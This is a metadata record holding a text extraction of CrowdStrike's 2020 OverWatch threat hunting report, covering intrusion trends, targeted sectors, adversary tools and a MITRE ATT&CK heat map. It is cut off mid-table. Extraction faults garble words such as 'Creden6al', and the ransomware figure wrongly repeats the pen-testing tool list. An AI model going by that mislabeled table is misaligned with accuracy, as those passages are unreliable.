{
    "id": "fbf4202c-bfc0-4ade-baa4-a87a68280139",
    "created_at": "2022-10-25T16:48:18.578139Z",
    "updated_at": "2025-03-27T02:17:23.4487Z",
    "deleted_at": null,
    "sha1_hash": "c779cbedc36ea2658aa8b2b07578ec90254a36da",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-09-14T20:59:05Z",
    "file_modification_date": "2020-09-14T18:17:03Z",
    "file_size": 1371254,
    "plain_text": "# NOWHERE TO HIDE\n\n##### 2020 THREAT HUNTING REPORT\n\n### INSIGHTS FROM THE CROWDSTRIKEOVERWATCHTEAM\n\n\n-----\n\n#### TABLE OF CONTENTS\n\n\n###### 3\n\n 4\n\n 6\n 6 7 8 13\n\n 15\n 15\n\n 17\n\n 20\n\n\n###### INTRODUCTION\n\n OVERWATCH SEARCH HUNTING METHODOLOGY\n\n INTRUSION CAMPAIGN SUMMARY INTRUSION CAMPAIGN NUMBERS ADVERSARY THREAT TYPES CAMPAIGNS BY VERTICAL ADVERSARIES BY VERTICAL\n\n INTRUSION TACTICS AND TECHNIQUES ADVERSARY TOOLS USED IN INTERACTIVE INTRUSIONS TACTICS AND TECHNIQUES OBSERVED IN INTERACTIVE INTRUSIONS COMPARING TTPS BETWEEN ECRIME AND STATE-SPONSORED ADVERSARIES\n\n\n###### 23\n 23\n\n 27\n\n 32\n\n 35\n\n 38\n\n 41 42\n\n\n###### INTRUSION HIGHLIGHTS HUNTING THWARTS LABYRINTH CHOLLIMA ATTACK LAUNCHED OVER SOCIAL MEDIA PANDA ABUSES GITHUB SERVICE FOR COVERT C2 TRACER KITTEN EXPLOITS CUSTOM BACKDOORS TO BREACH A TELECOMMUNICATIONS COMPANY BACKDOORED SSH SERVICE USED TO COLLECT CREDENTIALS FROM A TECHNOLOGY COMPANY SPIDER USES UNCOMMONLY SEEN TRADECRAFT IN AN ATTEMPT TO ESTABLISH FOOTHOLD IN A VICTIM’S ENVIRONMENT CONCLUSION RECOMMENDATIONS\n\n\n-----\n\n#### INTRODUCTION\n\n[Falcon OverWatch[TM] is the CrowdStrike® managed threat hunting service built](https://www.crowdstrike.com/endpoint-security-products/falcon-overwatch-threat-hunting)\n[on the CrowdStrike Falcon® platform. OverWatch provides deep and continuous](https://www.crowdstrike.com/endpoint-security-products/falcon-platform/)\nhuman analysis on a 24/7 basis to relentlessly hunt for anomalous or novel attacker\ntradecraft designed to evade other detection techniques.\n\nOverWatch comprises an elite team of cross-disciplinary specialists that harness\n[the massive power of the CrowdStrike Threat Graph®, enriched with CrowdStrike](https://www.crowdstrike.com/resources/data-sheets/threat-graph/)\nthreat intelligence, to continuously hunt, investigate and advise on sophisticated\nthreat activity in customer environments. Armed with cloud-scale telemetry of\nover 3 trillion endpoint events collected per week, and detailed tradecraft on 140\nadversary groups, OverWatch has the unparalleled ability to see and stop the most\nsophisticated threats, leaving adversaries with nowhere to hide[1].\n\nThis report provides a summary of OverWatch’s threat hunting findings from the first\nhalf of 2020. It reviews intrusion trends during that time frame, provides insights\ninto the current landscape of adversary tactics and delivers highlights of notable\nintrusions OverWatch identified. The report’s findings relate to the targeted and\ninteractive intrusions that OverWatch tracks and are not necessarily representative\nof the full spectrum of attacks that are stopped by the Falcon platform.\n\n[1 For more information on how Falcon OverWatch performs its mission, please see https://www.crowdstrike.com/endpoint-security-products/falcon-](https://www.crowdstrike.com/endpoint-security-products/falcon-overwatch-threat-hunting/)\n**[overwatch-threat-hunting/.](https://www.crowdstrike.com/endpoint-security-products/falcon-overwatch-threat-hunting/)**\n\n\n-----\n\n#### OVERWATCH SEARCH HUNTING METHODOLOGY\n\nOverWatch threat hunting exists with the express purpose of finding threats that\ntechnology on its own cannot. For the first time, this report is pulling back the curtain to\nreveal the methodology that sits behind the human-driven search engine that is Falcon\nOverWatch. Working around the clock, the OverWatch team employs the “SEARCH”\nhunting methodology to detect threats at scale. Using SEARCH, OverWatch threat\nhunters methodically sift through a world of unknown unknowns to find the faintest\ntraces of malicious activity and deliver actionable analysis to CrowdStrike customers\nin near real time. The OverWatch SEARCH methodology shines a light into the darkest\ncorners of customers’ environments — leaving adversaries with nowhere to hide.\n\n\n-----\n\n###### SENSE\n\nCrowdStrike’s rich telemetry creates the foundation for OverWatch threat hunting. Over 3 trillion\nevents per week, comprising hundreds of event types from millions of endpoints, are collected\nand catalogued by the Falcon platform to provide comprehensive visibility into activity across\nthe CrowdStrike install base.\n\n###### ENRICH\n\nCrowdStrike's proprietary Threat Graph contextualizes events and reveals relationships\nbetween data points in real time. Threat hunters add a further dimension to the data by drawing\non up-to-the-minute threat intelligence about the tradecraft of more than 140 adversary groups,\nas well as their intimate working knowledge of the tactics, techniques and procedures (TTPs) in\nuse in the wild. All of this is underpinned by OverWatch’s proprietary tools and processes, which\nensure every hunt is optimized for maximum efficiency.\n\n###### ANALYZE\n\nOverWatch analysts use complex statistical methods to identify anomalous activity. This is\nsupported by a deep understanding of adversary behaviors and motivations, enabling the team\nto form hypotheses about where adversaries may strike. The breadth and depth of experience\non the OverWatch team is world-class, with representation from every corner of public and\nprivate industry. Further, the team is continuously building its knowledge base, going toe-to-toe\nwith adversaries on the front line, 24/7/365.\n\n###### RECONSTRUCT\n\nIn order to take action against an adversary, it is critical to understand the full nature of the\nthreat. In just minutes, OverWatch analysts reconstruct threat activity, transforming it from a\ncollection of data points into a clear story. This information empowers organizations to not only\nremediate but also plug the gaps in their environment.\n\n###### COMMUNICATE\n\nTime is of the essence in preventing an intrusion from becoming a breach. OverWatch operates\nas a native component of the Falcon platform. Through Falcon, OverWatch delivers clear,\naccurate and actionable information on potentially malicious activity in near real time, enabling\norganizations to respond quickly and decisively, without friction.\n\n###### HONE\n\nWith each new threat, OverWatch extracts new insights to drive continuous improvements in\nautomated detections and human threat hunting. The team is consistently fine-tuning its skills\nand process to always stay a step ahead of the adversary.\n\nThrough the use of the SEARCH methodology, OverWatch was able to help organizations prevent\nmore than 41,000 potential breaches in the first half of 2020.\n\n\n-----\n\n#### INTRUSION CAMPAIGN SUMMARY\n\n###### INTRUSION CAMPAIGN NUMBERS\n\nIn the first half of 2020, there was a sharp rise in cyber activity tracked by\nOverWatch.\n\n**Figure 1: Increase in the number of potential intrusions identified by OverWatch in 2020**\n\n###### 1[st ]Half 2020\n\n**Cumulative** **2019**\n**Potential**\n**Intrusions** **41,000**\n**Identified** **40k**\n**by Falcon**\n**OverWatch** **35,000**\n\n###### 30k\n\n 20k\n\n 10k\n\n JAN APR JUL DEC\n\nIn the six months from January to June, OverWatch observed more hands-on-keyboard\nintrusions than were seen throughout all of 2019. This increase appears to be driven\npredominantly by the continued acceleration of eCrime activity. However, the rapid\nadoption of remote work practices and the accelerated setup of new infrastructure by\nmany companies — driven by the COVID-19 pandemic — also contributed to an everincreasing attack surface for motivated adversaries. Additionally, the pandemic created\nopportunities for adversaries to exploit public fear through the use of COVID-19-themed\nsocial engineering strategies.\n\n\n-----\n\n###### ADVERSARY THREAT TYPES\n\nIn 2020, eCrime continues to dominate the intrusions uncovered by OverWatch threat\nhunters. The increase in sophisticated eCrime activity relative to state-sponsored\nactivity is a trend that OverWatch has seen accelerate over the last three years[2]. Last\nyear’s OverWatch mid-year report revealed that for the first time, the frequency of\neCrime activity surpassed state-sponsored activity.\n\nIn the first half of 2020, eCrime activity well and truly outpaced state-sponsored activity,\nmaking up 82% of interactive intrusions observed by OverWatch. Put another way, for\neach state-sponsored campaign uncovered by an OverWatch analyst, the team sees\napproximately four eCrime intrusions. A likely explanation is that eCrime actors continue\nto achieve enormous success with “big game hunting” (BGH) campaigns, and the\navailability of commodity malware through ransomware-as-a-service (RaaS) models has\ncontributed to a proliferation of activity from a wider array of eCrime actors[3].\n\n2 These numbers represent cases where attribution has been possible. OverWatch partners with the CrowdStrike Intelligence team to analyze adversaries\nperforming intrusion activity. Attribution to a high degree of confidence is not always immediately possible, resulting in several OverWatch intrusion cases\nremaining officially unattributed and therefore excluded from this reporting.\n\n3 eCrime actors’ use of commodity malware and the continued growth of big game hunting are further explained and detailed in the 2020 CrowdStrike\nGlobal Threat Report, available at https://www.crowdstrike.com/resources/reports/2020-crowdstrike-global-threat-report/.\n\n\n-----\n\n**Figure 3: Relative prevalence of state-sponsored and eCrime intrusions in interactive activity tracked by OverWatch, first half of 2020**\n**compared to 2019**\n\n**State-** **State-**\n**Sponsored** **Sponsored**\n\n##### 18% 31%\n\n###### % JAN TO JUN 2020 % JAN TO DEC 2019\n\n**eCrime** **eCrime**\n\n##### 82% 69%\n\n###### CAMPAIGNS BY VERTICAL\n\nAs noted, there has been a significant increase in interactive intrusion activity in 2020.\nFigure 4 shows the top 10 most frequently impacted industry verticals in the first half of\n2020, as observed by OverWatch.\n\nSome trends from OverWatch’s recent reporting have held firm; in particular, the\ntechnology, telecommunications and financial industries have remained among the most\nfrequently targeted sectors. In contrast, the manufacturing industry has experienced a\ndramatic increase in interactive intrusion activity compared to past years. From January\nto June 2020, manufacturing was the second most frequently targeted industry vertical.\nIn comparison, it was not in the top 10 in 2019.\n\n\n-----\n\n###### IN FOCUS: MANUFACTURING\n\nThe escalation of activity in the manufacturing sector has occurred in terms of both the quantity and sophistication of\nthe intrusions. Among the intrusions uncovered this year, OverWatch has observed a state-sponsored actor employing\nnovel techniques to deploy tooling within a victim environment. Threat hunters have also uncovered examples of\neCrime actors adapting and evolving their TTPs to maximize impact.\n\nA feature of the manufacturing threat landscape is that it is among only a handful of industries that OverWatch\nroutinely sees targeted by both state-sponsored and eCrime adversaries. The often-critical nature of manufacturing\noperations and the valuable data that many manufacturing businesses hold make the industry an enticing target for\nadversary groups seeking to extract value and further their strategic objectives.\n\nFor a deep dive into observations in the manufacturing industry in 2020, see this OverWatch blog on the subject:\n**https://www.crowdstrike.com/blog/adversaries-targeting-the-manufacturing-industry/.**\n\n\n**Figure 4: Top 10 most frequently impacted industry verticals in the first half of 2020**\n\n\n-----\n\n###### INTRUSIONS BY REGION (TOP 10 VERTICALS)\n\nFigure 5 provides a snapshot of the geographical spread of interactive intrusion activity\nin the top 10 most frequently impacted industry verticals. Evidence of hands-on intrusion\nin every region around the world serves to demonstrate that cyberattacks are not a\nproblem for just one country or just one industry. The motivations and incentives for\ncyber adversaries are as diverse as the organizations they attack.\n\n**Figure 5: Geographical distribution of intrusions in the top 10 most frequently impacted**\n**industry verticals, January-June 2020**\n\n|Vertical Technology|APAC Asia Pacific|EMEA Europe, Middle East and Africa|North America|South and Central America|\n|---|---|---|---|---|\n|Manufacturing|||||\n|Telecommunications|||||\n|Financial|||||\n|Healthcare|||||\n|Academic|||||\n|Professional Services|||||\n|Government|||||\n|Food & Beverage|||||\n|Engineering|||||\n\n\n-----\n\n###### INTERACTIVE ATTACKS AT PANDEMIC PROPORTIONS\n\nIn addition to the overall spike in interactive intrusion activity, OverWatch has seen some\ninteresting fluctuations in the frequency of activity in some industry verticals. While the\nsample size makes it difficult to draw any absolute conclusions about the cause of these\nfluctuations, there are certainly some notable changes. Figure 6 shows the industries\nthat have seen the biggest variation in frequency of interactive activity, relative to 2019.\n\n**Figure 6: Industry verticals that have experienced the most significant change in intrusion frequency in 2019 and the first half of 2020**\n\n**20%**\n\n###### RELATIVE FREQUENCY OF INTRUSIONS, JAN TO JUN 2020\n\n**19.2%**\n\n**17.5%** **RELATIVE FREQUENCY OF INTRUSIONS, 2019**\n\n**15%**\n\n**11.1%**\n\n**10%**\n\n**8.9%**\n\n**7.0%**\n\n**5.7%** **5.4%**\n\n**5%** **5.3%**\n\n**4.6%** **3.8%** **5.0%**\n\n**3.3%** **3.3%** **3.3%** **3.3%**\n\n**2.5%**\n\n**1.7%** **1.6%**\n**1.0%**\n**0.6%**\n\n**0%**\n\nTechnology Manufacturing Financial Healthcare Academic Food Retail Hospitality NGO Aviation\n& Beverage (Inc. Think\nTanks)\n\nThe changes observed in the frequency with which these industries fell victim to\nintrusion activity in the first half of 2020 could indicate that adversaries have adjusted\ntheir targets in response to the rapidly shifting economic conditions driven by the\nCOVID-19 pandemic. The healthcare, manufacturing, and food and beverage industries\nall saw spikes in interactive intrusion activity. It is reasonable to surmise that these\nindustries in particular have experienced a more complex operating environment during\nthe pandemic due to supply chain disruptions and dramatic changes in demand. On\nboth counts this may have contributed to a perception that these sectors may be\nmore inclined to pay a ransom to prevent further disruption. There are also a range of\nreasons why state-sponsored adversaries may see these sectors as valuable targets.\nInternational trade tensions, increased competition for essential goods, and efforts by\nsome firms to decrease their reliance on offshore suppliers could all have contributed to\nincreased foreign interest in the operations of firms in these sectors.\n\n|Col1|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|5.3% 4.6% 3.8% 5.0% 3.3% 3.3% 3.3% 3.3% 2.5% 1.7% 1.6%|||||\n\n\n-----\n\nIt is also interesting to look at the sectors that experienced a decline in interactive\nintrusion activity — among them aviation, retail and hospitality. These are among the\nindustries that were hit hardest by widespread “stay-at-home” directives. The slowdown\nin these sectors may have contributed to them being seen as less attractive targets,\nparticularly for financially motivated adversaries.\n\n\n###### IN FOCUS: HEALTHCARE\n\nIn recent months, the world has witnessed the global COVID-19 pandemic place unprecedented pressure on global\nhealthcare systems. Concurrently, the pandemic has been the catalyst for a paradigm shift in the way organizations\noperate, with many businesses scrambling to stand up a remote workforce. This has created a perfect storm for\nadversaries to launch attacks against an overstretched healthcare industry.\n\nOf the interactive healthcare intrusions observed in the first half of 2020 where attribution was possible, around 75%\nwere attributed to eCrime, despite some criminal actors having committed publicly to not attacking the healthcare\nindustry. The remaining intrusions have been attributed to state-sponsored actors and may have been driven in part by\nthe global race to find a cure for the COVID-19 virus.\n\nFor a deep dive into observations in the healthcare industry in 2020, see this OverWatch blog on the subject: https://\n**www.crowdstrike.com/blog/how-threat-hunting-uncovers-covid-19-healthcare-attacks.**\n\n\n###### VERTICALS TO WATCH\n\nWith the effects of the global health and economic crisis far from over, it remains to be\nseen how the cybersecurity landscape will adjust to this new normal. In addition to the\nchanges described, OverWatch has observed early indications of an uptick in activity\nin the agricultural industry, which may indicate that adversaries are responding to the\nsecond-order effects of the pandemic, including heightened trade tensions and food\nsecurity concerns. What is clear is that where there is opportunity, cyber adversaries\nare ready to strike. With the surge in interactive intrusion activity seen in 2020, it is\nmore important than ever that businesses across all industry sectors assume a strong\nsecurity posture.\n\n\n-----\n\n**Adversary Group**\n**Naming Convention**\n\n\n###### ADVERSARIES BY VERTICAL\n\nOverWatch mapping of adversary activity by industry vertical serves to reinforce\nhow prolific eCrime (aka SPIDER) activity has been in the first half of 2020. The\nrepresentation of SPIDER adversaries across verticals widened significantly compared\nto past years. The 2019 mid-year report documented hands-on-keyboard SPIDER\ncampaigns across 13 industries. In the first half of 2020, OverWatch has already\nobserved such SPIDER campaigns in 27 distinct industries — more than double this time\nlast year.\n\nThe data also reveals the scope of state-sponsored activity over the past six months.\nThe agriculture, healthcare, media, technology and telecommunications industries were\nall the targets of state-sponsored campaigns originating from more than one country.\nA particular standout from the data relates to the telecommunications industry, which\ncontinues to be a popular target for state-sponsored adversaries. OverWatch observed\nsix distinct known PANDA actors conducting campaigns against telecommunications\ncompanies in the first half of 2020.\n\nThe heat map in Figure 7 shows which adversary groups were active in particular\nindustry verticals. The darker color represents a higher number of known actors within\nthat country grouping being active within a particular vertical. The heat mapping is not\nindicative of the total number of intrusions within a vertical, as multiple intrusions by\nthe same adversary group are only represented once. It is also important to note that\nattribution to a high degree of confidence is not always possible, and this heat map does\nnot reflect unattributed activity.\n\n|Adversary CHOLLIMA|Nation-state or Category Democratic People’s Republic of Korea (DPRK, North Korea)|\n|---|---|\n|KITTEN|Iran|\n|PANDA|People’s Republic of China|\n|SPIDER|eCrime|\n\n\n-----\n\n###### HEAT MAP OF INTRUSIONS BY VERTICAL AND ADVERSARY GROUP\n\n**Figure 7: Prevalence of threat actor groups by industry vertical, January-June 2020**\n\n###### A D V E R S A R Y\n\n VERTICAL CHOLLIMAS KITTENS PANDAS SPIDERS\n N. Korea Iran China eCrime\n\nAcademic\n\nAerospace\n\nAgriculture\n\nAutomotive\n\nEducation\n\nEnergy\n\nEngineering\n\nEntertainment\n\nFinancial\n\nFood & Beverage\n\nGaming\n\nGovernment\n\nHealthcare\n\nHospitality\n\nInsurance\n\nLegal\n\nManufacturing\n\nMarketing\n\nMedia\n\nMining\n\nNon-Profit\n\nOil & Gas\n\nPharmaceutical\n\nProfessional Services\n\nRetail\n\nTechnology\n\nTelecommunications\n\nTransportation & Logistics\n\n|CHOLLIMAS N. Korea|KITTENS Iran|PANDAS China|SPIDERS eCrime|\n|---|---|---|---|\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n|||||\n\n\n-----\n\n#### INTRUSION TACTICS AND TECHNIQUES\n\n###### ADVERSARY TOOLS USED IN INTERACTIVE INTRUSIONS\n\nThe use of native host tools to conduct an intrusion — also known as “living off the land”\n— is a popular choice for hands-on-keyboard adversaries attempting to avoid detection[4].\nBy using legitimate tools already installed on the victim host, malicious activity can be\nhidden in plain sight. This underscores the importance of human-driven, managed threat\nhunting, which sifts out the malicious from the innocuous to rapidly identify these sorts\nof stealthy intrusions.\n\nOverWatch closely tracks adversary use of non-native administrative tools — that\nis, otherwise legitimate administration tools not already native to the host operating\nsystem. Figure 8 depicts those most commonly seen in the first half of 2020, listed in\norder of prevalence.\n\n**Figure 8: Non-native tools commonly**\n**seen in the first half of 2020**\n\n\nLegitimate Non-Native Tools Used\nby Interactive Adversaries (in Order\nof Prevalence), January–June 2020\n\n|1|Process Hacker|\n|---|---|\n|2|ProcDump|\n|3|Advanced IP Scanner|\n|4|TeamViewer|\n|5|Advanced Port Scanner|\n|6|IObit Unlocker|\n|7|PowerTool|\n|8|PC Hunter|\n|9|GMER|\n|10|AnyDesk|\n\n\n4 For example, see https://www.crowdstrike.com/blog/going-beyond-malware-the-rise-of-living-off-the-land-attacks/.\n\n\n-----\n\nThe most common penetration-testing tools observed by OverWatch during the first six\nmonths of 2020 are listed in Figure 9. Tools typically associated with penetration testing\nremain popular with interactive adversaries. They are easy to acquire, powerful and so\nubiquitous that their use does not easily lead to identifying the perpetrator. As a result,\nOverWatch expects them to remain a popular choice in adversaries’ arsenals.\n\n**Figure 9: Pen-testing tools commonly**\n**seen in the first half of 2020**\n\nPen-Testing Tools Used in\nInteractive Intrusions (in Order of\nPrevalence), January–June 2020\n\n1 Mimikatz\n\n2 Cobalt Strike\n\n3 PowerShell Empire\n\n4 PowerSploit\n\n5 Meterpreter\n\n6 LaZagne\n\n7 SharpHound\n\n8 Powerkatz\n\n9 PowerCat\n\n10 Rubeus\n\nFigure 10 shows the most common ransomware observed by OverWatch in interactive\neCrime attacks during the first half of 2020.\n\n**Figure 10: The most frequently seen ransomware types in**\n**interactive eCrime intrusions, January-June 2020**\n\n|1|Mimikatz|\n|---|---|\n|2|Cobalt Strike|\n|3|PowerShell Empire|\n|4|PowerSploit|\n|5|Meterpreter|\n|6|LaZagne|\n|7|SharpHound|\n|8|Powerkatz|\n|9|PowerCat|\n|10|Rubeus|\n\n\n###### TOP 5 RANSOMWARE TYPES IDENTIFIED IN INTERACTIVE INTRUSIONS (RELATIVE PREVALENCE)\n\n\n-----\n\n###### TACTICS AND TECHNIQUES OBSERVED IN INTERACTIVE INTRUSIONS\n\nThe Falcon OverWatch team uses the MITRE ATT&CK® matrix as a framework to\ncategorize and track adversary behavior[5]. In July 2020, MITRE released the latest\nversion of the ATT&CK matrix (v7), which in addition to a number of new techniques now\nincludes sub-techniques, which will allow for activity to be tracked at a more granular\nlevel[6]. Because this report relates to the first half of 2020, the activity is mapped to\nthe version of the ATT&CK matrix that was current at the time of the intrusions (v6.3).\nFuture reporting will call out any substantive changes in how OverWatch is tracking\nadversary activity and highlight any impact on the comparability of data over time.\n\n###### 2020 ATT&CK HEAT MAP\n\nFigure 11 is a heat map of the adversary tactics and techniques that OverWatch threat\nhunters have seen across all hands-on-keyboard intrusion campaigns during the first\nhalf of 2020. The techniques observed largely mirror the activity observed throughout\n2019. However, one trend emerging in early 2020 is the increased use of discovery\ntechniques. In particular, security software discovery was observed being employed by\neCrime adversaries three times as frequently as it was throughout 2019. This suggests\nthat criminally motivated adversaries are employing more sophisticated methods when\ntrying to understand their victims and evade defense — in contrast to the “smash and\ngrab” attacks seen more commonly in past years. OverWatch also continues to routinely\nsee valid credentials exploited to further actions on objectives, reinforcing how crucial\nit is for every organization to enforce strong password policies, including the use of\nmultifactor authentication. Just as importantly, as illustrated in Figure 11, adversaries\ncontinue to employ a wide variety of techniques in the pursuit of their objectives — and\naccordingly, there is no single “silver bullet” for mitigating cyber threats.\n\n5 More information about MITRE's ATT&CK matrix is available online at https://attack.mitre.org/.\n\n6 \u0007Further details about the ATT&CK v7 updates are outlined online at https://attack.mitre.org/resources/updates/ and future OverWatch reporting will\nincorporate the new sub-technique structure.\n\n\n-----\n\n**Figure 11: The most commonly observed TTPs in interactive intrusions tracked by OverWatch, January-June 2020**\n\n|Ini$al Access|Execu$on|Persistence|Privilege Escala$on|Defense Evasion|Creden$al Access|\n|---|---|---|---|---|---|\n|Valid Accounts|Command-Line Interface|Valid Accounts|Valid Accounts|Valid Accounts|Creden6al Dumping|\n|Exploit Public-Facing Applica6on|Scrip6ng|Web Shell|Web Shell|Scrip6ng|Brute Force|\n|External Remote Services|PowerShell|Create Account|Process Injec6on|Disabling Security Tools|Account Manipula6on|\n|Spearphishing APachment|Windows Management Instrumenta6on|Account Manipula6on|Scheduled Task|Masquerading|Creden6als in Files|\n|Spearphishing Link|Rundll32|Scheduled Task|Accessibility Features|Indicator Removal on Host|Bash History|\n|Spearphishing via Service|Scheduled Task|Accessibility Features|New Service|Modify Registry|Creden6als in Registry|\n|Supply Chain Compromise|Graphical User Interface|New Service|Bypass User Account Control|Rundll32|Input Capture|\n|Trusted Rela6onship|Service Execu6on|Registry Run Keys / Startup Folder|Exploita6on for Privilege Escala6on|Obfuscated Files or Informa6on|Creden6als from Web Browsers|\n|Drive-by Compromise|Regsvr32|Modify Exis6ng Service|Image File Execu6on Op6ons Injec6on|Process Injec6on|Kerberoas6ng|\n|Hardware Addi6ons|Mshta|External Remote Services|Sudo|File Dele6on|Private Keys|\n|Replica6on Through Removable Media|User Execu6on|Hidden Files and Directories|DLL Search Order Hijacking|Regsvr32|Steal Web Session Cookie|\n|Exploita6on for Client Execu6on Image File Execu6on Op6ons Injec6on Access Token Manipula6on Trusted Developer U6li6es BITS Jobs Setuid and Setgid Local Job Scheduling DLL Search Order Hijacking AppInit DLLs Third-party SoUware Setuid and Setgid Parent PID Spoofing Regsvcs/Regasm Local Job Scheduling Service Registry Permissions Weakness Component Object Model and Redundant Access AppCert DLLs Distributed COM Execu6on through API .bash_profile and .bashrc Applica6on Shimming Execu6on through Module Load AppInit DLLs Dylib Hijacking InstallU6l Logon Scripts Elevated Execu6on with Prompt AppleScript Netsh Helper DLL Emond CMSTP Office Applica6on Startup Extra Window Memory Injec6on Compiled HTML File Screensaver File System Permissions Weakness Control Panel Items Service Registry Permissions Weakness Hooking Dynamic Data Exchange Windows Management Instrumenta6on Launch Daemon Event Subscrip6on Launchctl AppCert DLLs Path Intercep6on LSASS Driver Applica6on Shimming Plist Modifica6on Signed Binary Proxy Execu6on Authen6ca6on Package Port Monitors Signed Script Proxy Execu6on Bootkit PowerShell Profile Source Browser Extensions SID-History Injec6on Space aUer Filename Change Default File Associa6on Startup Items Trap Component Firmware Sudo Caching Windows Remote Management Component Object Model Hijacking XSL Script Processing Dylib Hijacking Emond File System Permissions Weakness Hooking Hypervisor Kernel Modules and Extensions Launch Agent Launch Daemon Launchctl LC_LOAD_DYLIB Addi6on Login Item LSASS Driver Path Intercep6on Plist Modifica6on Port Knocking Port Monitors PowerShell Profile Rc.common Re-opened Applica6ons Security Support Provider Server SoUware Component Shortcut Modifica6on SIP and Trust Provider Hijacking Startup Items System Firmware Systemd Service Time Providers Trap Winlogon Helper DLL|Exploita6on for Client Execu6on|Image File Execu6on Op6ons Injec6on|Access Token Manipula6on|Connec6on Proxy|Network Sniffing|\n||Trusted Developer U6li6es|BITS Jobs|Setuid and Setgid|Deobfuscate/Decode Files or Informa6on|Exploita6on for Creden6al Access|\n||Local Job Scheduling|DLL Search Order Hijacking|AppInit DLLs|Mshta|Forced Authen6ca6on|\n||Third-party SoUware|Setuid and Setgid|Parent PID Spoofing|Process Hollowing|Hooking|\n||Regsvcs/Regasm|Local Job Scheduling|Service Registry Permissions Weakness|Hidden Window|Input Prompt|\n||Component Object Model and Distributed COM|Redundant Access|AppCert DLLs|Network Share Connec6on Removal|Keychain|\n||Execu6on through API|.bash_profile and .bashrc|Applica6on Shimming|Bypass User Account Control|LLMNR/NBT-NS Poisoning and Relay|\n||Execu6on through Module Load|AppInit DLLs|Dylib Hijacking|Hidden Users|Password Filter DLL|\n||InstallU6l|Logon Scripts|Elevated Execu6on with Prompt|Hidden Files and Directories|Securityd Memory|\n||AppleScript|Netsh Helper DLL|Emond|File and Directory Permissions Modifica6on|Two-Factor Authen6ca6on Intercep6on|\n||CMSTP|Office Applica6on Startup|Extra Window Memory Injec6on|Timestomp||\n||Compiled HTML File|Screensaver|File System Permissions Weakness|Compile AUer Delivery||\n||Control Panel Items|Service Registry Permissions Weakness|Hooking|Image File Execu6on Op6ons Injec6on||\n||Dynamic Data Exchange|Windows Management Instrumenta6on Event Subscrip6on|Launch Daemon|Web Service||\n||Launchctl|AppCert DLLs|Path Intercep6on|BITS Jobs||\n||LSASS Driver|Applica6on Shimming|Plist Modifica6on|DLL Search Order Hijacking||\n||Signed Binary Proxy Execu6on|Authen6ca6on Package|Port Monitors|DLL Side-Loading||\n||Signed Script Proxy Execu6on|Bootkit|PowerShell Profile|Exploita6on for Defense Evasion||\n||Source|Browser Extensions|SID-History Injec6on|Trusted Developer U6li6es||\n||Space aUer Filename|Change Default File Associa6on|Startup Items|Access Token Manipula6on||\n||Trap|Component Firmware|Sudo Caching|Clear Command History||\n||Windows Remote Management|Component Object Model Hijacking||Redundant Access||\n||XSL Script Processing|Dylib Hijacking||NTFS File APributes||\n|||Emond||Regsvcs/Regasm||\n|||File System Permissions Weakness||Code Signing||\n|||Hooking||Group Policy Modifica6on||\n|||Hypervisor||HISTCONTROL||\n|||Kernel Modules and Extensions||Indicator Removal from Tools||\n|||Launch Agent||InstallU6l||\n|||Launch Daemon||Parent PID Spoofing||\n|||Launchctl||Rootkit||\n|||LC_LOAD_DYLIB Addi6on||SoUware Packing||\n|||Login Item||Template Injec6on||\n|||LSASS Driver||Binary Padding||\n|||Path Intercep6on||CMSTP||\n|||Plist Modifica6on||Compiled HTML File||\n|||Port Knocking||Component Firmware||\n|||Port Monitors||Component Object Model Hijacking||\n|||PowerShell Profile||Control Panel Items||\n|||Rc.common||DCShadow||\n|||Re-opened Applica6ons||Execu6on Guardrails||\n|||Security Support Provider||Extra Window Memory Injec6on||\n|||Server SoUware Component||File System Logical Offsets||\n|||Shortcut Modifica6on||Gatekeeper Bypass||\n|||SIP and Trust Provider Hijacking||Indicator Blocking||\n|||Startup Items||Indirect Command Execu6on||\n|||System Firmware||Install Root Cer6ficate||\n|||Systemd Service||Launchctl||\n|||Time Providers||LC_MAIN Hijacking||\n|||Trap||Plist Modifica6on||\n|||Winlogon Helper DLL||Port Knocking||\n|||||Process Doppelgänging||\n|||||Signed Binary Proxy Execu6on||\n|||||Signed Script Proxy Execu6on||\n|||||SIP and Trust Provider Hijacking||\n|||||Space aUer Filename||\n|||||Virtualiza6on/Sandbox Evasion||\n|||||XSL Script Processing||\n\n\n-----\n\n|Discovery|Lateral Movement|Collec$on|Command And Control|Exfiltra$on|Impact|\n|---|---|---|---|---|---|\n|Account Discovery|Remote Desktop Protocol|Data from Local System|Remote File Copy|Data Compressed|Data Encrypted for Impact|\n|System Owner/User Discovery|Remote File Copy|Data Staged|Commonly Used Port|Exfiltra6on Over Command and Control Channel|Inhibit System Recovery|\n|Remote System Discovery|Windows Admin Shares|Data from Network Shared Drive|Standard Applica6on Layer Protocol|Exfiltra6on Over Alterna6ve Protocol|Service Stop|\n|System Network Configura6on Discovery|Remote Services|Data from Informa6on Repositories|Remote Access Tools|Data Encrypted|System Shutdown/Reboot|\n|System Network Connec6ons Discovery|Third-party SoUware|Input Capture|Uncommonly Used Port|Automated Exfiltra6on|Resource Hijacking|\n|File and Directory Discovery|Pass the Hash|Screen Capture|Connec6on Proxy|Data Transfer Size Limits|Run6me Data Manipula6on|\n|System Informa6on Discovery|Component Object Model and Distributed COM|Automated Collec6on|Custom Command and Control Protocol|Exfiltra6on Over Other Network Medium|Account Access Removal|\n|Process Discovery|Logon Scripts|Clipboard Data|Standard Cryptographic Protocol|Exfiltra6on Over Physical Medium|Data Destruc6on|\n|Permission Groups Discovery|AppleScript|Audio Capture|Web Service|Scheduled Transfer|Defacement|\n|Network Service Scanning|Applica6on Deployment SoUware|Data from Removable Media|||Disk Content Wipe|\n|Network Share Discovery|Exploita6on of Remote Services|Email Collec6on|||Disk Structure Wipe|\n|Domain Trust Discovery|Internal Spearphishing|Man in the Browser|||Endpoint Denial of Service|\n|Query Registry|Pass the Ticket|Video Capture|||Firmware Corrup6on|\n|System Service Discovery|Replica6on Through Removable Media||Mul6-hop Proxy||Network Denial of Service|\n|Security SoUware Discovery|Shared Webroot||Mul6layer Encryp6on||Stored Data Manipula6on|\n|System Time Discovery|SSH Hijacking||Communica6on Through Removable Media||TransmiPed Data Manipula6on|\n|SoUware Discovery|Taint Shared Content||Custom Cryptographic Protocol|||\n|Password Policy Discovery|Windows Remote Management||Domain 